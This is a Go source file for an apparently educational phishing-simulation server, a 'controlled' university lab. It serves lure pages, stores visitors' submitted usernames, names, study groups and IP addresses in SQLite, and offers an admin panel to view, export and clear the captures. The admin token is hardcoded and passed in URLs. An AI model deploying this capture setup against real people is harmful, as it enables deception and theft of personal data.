package main

import (
	"database/sql"
	"embed"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

//go:embed dist/*
var staticFiles embed.FS

const adminToken = "utp-admin-secret-2025"
const dbFile = "capturas.db"

var db *sql.DB

type Submission struct {
	Username string `json:"username"`
	Email    string `json:"email"`
	Nombre   string `json:"nombre"`
	Grupo    string `json:"grupo"`
	Carrera  string `json:"carrera"`
	Step     string `json:"step"`
}

type Capture struct {
	ID        int
	FechaHora string
	Usuario   string
	Nombre    string
	Grupo     string
	Carrera   string
	IP        string
	Paso      string
}

func main() {
	initDB()

	mux := http.NewServeMux()

	mux.HandleFunc("/api/login", handleLogin)
	mux.HandleFunc("/api/admin", handleAdmin)
	mux.HandleFunc("/api/captures/count", handleCount)
	mux.HandleFunc("/api/captures/clear", handleClear)
	mux.HandleFunc("/api/captures/export", handleExport)

	sub, err := fs.Sub(staticFiles, "dist")
	if err != nil {
		log.Fatal(err)
	}

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path

		if path == "/" || path == "" {
			path = "/index.html"
		} else if path == "/skull" || path == "/skull.html" {
			path = "/skull/index.html"
		} else if path == "/alert" || path == "/alert.html" {
			path = "/alert/index.html"
		} else if path == "/deletion" || path == "/deletion.html" {
			path = "/deletion/index.html"
		}

		data, err := fs.ReadFile(sub, path[1:])
		if err != nil {
			http.NotFound(w, r)
			return
		}

		contentType := "text/plain"
		switch {
		case strings.HasSuffix(path, ".html"):
			contentType = "text/html; charset=utf-8"
		case strings.HasSuffix(path, ".css"):
			contentType = "text/css"
		case strings.HasSuffix(path, ".js"), strings.HasSuffix(path, ".mjs"):
			contentType = "application/javascript"
		case strings.HasSuffix(path, ".jpg"), strings.HasSuffix(path, ".jpeg"):
			contentType = "image/jpeg"
		case strings.HasSuffix(path, ".png"):
			contentType = "image/png"
		case strings.HasSuffix(path, ".gif"):
			contentType = "image/gif"
		case strings.HasSuffix(path, ".svg"):
			contentType = "image/svg+xml"
		case strings.HasSuffix(path, ".ico"):
			contentType = "image/x-icon"
		case strings.HasSuffix(path, ".webp"):
			contentType = "image/webp"
		}

		w.Header().Set("Content-Type", contentType)
		w.Write(data)
	})

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("=== Laboratorio de Phishing UTP ===")
	log.Printf("Servidor: http://0.0.0.0:%s", port)
	log.Printf("Admin:    http://0.0.0.0:%s/api/admin?token=%s", port, adminToken)
	log.Fatal(http.ListenAndServe("0.0.0.0:"+port, mux))
}

func initDB() {
	var err error
	db, err = sql.Open("sqlite", dbFile)
	if err != nil {
		log.Fatalf("Cannot open database: %v", err)
	}

	query := `CREATE TABLE IF NOT EXISTS capturas (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		fecha_hora TEXT,
		usuario TEXT,
		nombre TEXT,
		grupo TEXT,
		carrera TEXT,
		ip TEXT,
		paso TEXT
	)`
	if _, err := db.Exec(query); err != nil {
		log.Fatalf("Cannot create table: %v", err)
	}
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var s Submission
	if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	ip := getIP(r)
	now := time.Now().Format("2006-01-02 15:04:05")

	if s.Step == "1" {
		log.Printf("[PASO 1] Usuario: %s, IP: %s", s.Username, ip)
	} else {
		log.Printf("[PASO 2] Nombre: %s, Grupo: %s, Carrera: %s, IP: %s", s.Nombre, s.Grupo, s.Carrera, ip)
	}

	_, err := db.Exec(
		"INSERT INTO capturas (fecha_hora, usuario, nombre, grupo, carrera, ip, paso) VALUES (?, ?, ?, ?, ?, ?, ?)",
		now, s.Username, s.Nombre, s.Grupo, s.Carrera, ip, s.Step,
	)
	if err != nil {
		log.Printf("Error writing to database: %v", err)
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func handleAdmin(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token != adminToken {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	captures := queryCaptures()
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, renderAdmin(captures))
}

func handleCount(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token != adminToken {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	var count int
	db.QueryRow("SELECT COUNT(*) FROM capturas").Scan(&count)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{"count": count})
}

func handleClear(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token != adminToken {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	db.Exec("DELETE FROM capturas")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "cleared"})
}

func handleExport(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token != adminToken {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	captures := queryCaptures()
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", "attachment; filename=capturas.csv")

	writer := csv.NewWriter(w)
	writer.Write([]string{"fecha_hora", "usuario", "nombre", "grupo", "carrera", "ip", "paso"})
	for _, c := range captures {
		writer.Write([]string{c.FechaHora, c.Usuario, c.Nombre, c.Grupo, c.Carrera, c.IP, c.Paso})
	}
	writer.Flush()
}

func queryCaptures() []Capture {
	rows, err := db.Query("SELECT id, fecha_hora, usuario, nombre, grupo, carrera, ip, paso FROM capturas ORDER BY id ASC")
	if err != nil {
		return nil
	}
	defer rows.Close()

	var captures []Capture
	for rows.Next() {
		var c Capture
		if err := rows.Scan(&c.ID, &c.FechaHora, &c.Usuario, &c.Nombre, &c.Grupo, &c.Carrera, &c.IP, &c.Paso); err != nil {
			continue
		}
		captures = append(captures, c)
	}
	return captures
}

func getIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}
	idx := strings.LastIndex(r.RemoteAddr, ":")
	if idx >= 0 {
		return r.RemoteAddr[:idx]
	}
	return r.RemoteAddr
}

func renderAdmin(captures []Capture) string {
	html := `<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Admin - Capturas</title>
	<style>
		* { margin:0; padding:0; box-sizing:border-box; }
		body { font-family:'Segoe UI',Arial,sans-serif; background:#0f0f1a; color:#e0e0e0; padding:20px; }
		.container { max-width:1200px; margin:0 auto; }
		h1 { color:#ff4444; margin-bottom:4px; font-size:22px; }
		.subtitle { color:#888; margin-bottom:16px; font-size:13px; }
		.actions { margin:16px 0; display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
		.badge { display:inline-block; background:#ff4444; color:#fff; padding:3px 10px; border-radius:10px; font-size:12px; }
		.btn { padding:7px 14px; border:none; border-radius:4px; cursor:pointer; font-size:13px; text-decoration:none; display:inline-block; }
		.btn-refresh { background:#4a4a8a; color:#fff; }
		.btn-refresh:hover { background:#5a5aaa; }
		.btn-danger { background:#ff4444; color:#fff; }
		.btn-danger:hover { background:#cc3333; }
		.btn-export { background:#228B22; color:#fff; }
		.btn-export:hover { background:#1a6b1a; }
		table { width:100%; border-collapse:collapse; background:#1a1a2e; border-radius:8px; overflow:hidden; }
		th { background:#16213e; color:#ff4444; padding:10px 8px; text-align:left; font-size:12px; text-transform:uppercase; }
		td { padding:9px 8px; border-bottom:1px solid #2a2a4e; font-size:13px; word-break:break-all; }
		tr:hover { background:#222244; }
		.empty { text-align:center; padding:40px; color:#666; }
		.footer { margin-top:20px; text-align:center; color:#555; font-size:12px; }
		@media(max-width:768px){ body { padding:10px; } table { font-size:11px; } th,td { padding:5px 3px; } }
	</style>
</head>
<body>
	<div class="container">
		<h1>Panel Admin - Capturas</h1>
		<p class="subtitle">Laboratorio de Phishing &mdash; Entorno Controlado</p>

		<div class="actions">
			<span class="badge">` + fmt.Sprintf("%d", len(captures)) + ` capturas</span>
			<button class="btn btn-refresh" onclick="location.reload()">Refrescar</button>
			<a class="btn btn-export" href="/api/captures/export?token=` + adminToken + `">Exportar CSV</a>
			<button class="btn btn-danger" onclick="if(confirm('¿Borrar todos los datos? Esta acci\u00f3n es irreversible.')){fetch('/api/captures/clear?token=` + adminToken + `',{method:'POST'}).then(()=>location.reload())}">Borrar todo</button>
		</div>

		<table>
			<thead>
				<tr>
					<th>#</th>
					<th>Paso</th>
					<th>Fecha/Hora</th>
					<th>Usuario</th>
					<th>Nombre</th>
					<th>Grupo</th>
					<th>Carrera</th>
					<th>IP</th>
				</tr>
			</thead>
			<tbody>
	`

	if len(captures) == 0 {
		html += `<tr><td colspan="8" class="empty">No hay capturas a\u00fan</td></tr>`
	} else {
		for i, c := range captures {
			stepDisplay := "Paso " + c.Paso
			if c.Paso == "1" {
				stepDisplay = `<span style="color:#ffaa00">Paso 1</span>`
			} else if c.Paso == "2" {
				stepDisplay = `<span style="color:#4CAF50">Paso 2</span>`
			}

			html += fmt.Sprintf(`
				<tr>
					<td>%d</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
				</tr>`,
				i+1, stepDisplay, esc(c.FechaHora), esc(c.Usuario), esc(c.Nombre), esc(c.Grupo), esc(c.Carrera), esc(c.IP))
		}
	}

	html += `
			</tbody>
		</table>
		<div class="footer">Entorno controlado - Laboratorio de Ciberseguridad UTP</div>
	</div>
</body>
</html>`
	return html
}

func esc(s string) string {
	var result []byte
	for _, c := range []byte(s) {
		switch c {
		case '&':
			result = append(result, "&amp;"...)
		case '<':
			result = append(result, "&lt;"...)
		case '>':
			result = append(result, "&gt;"...)
		case '"':
			result = append(result, "&quot;"...)
		case '\'':
			result = append(result, "&#39;"...)
		default:
			result = append(result, c)
		}
	}
	return string(result)
}
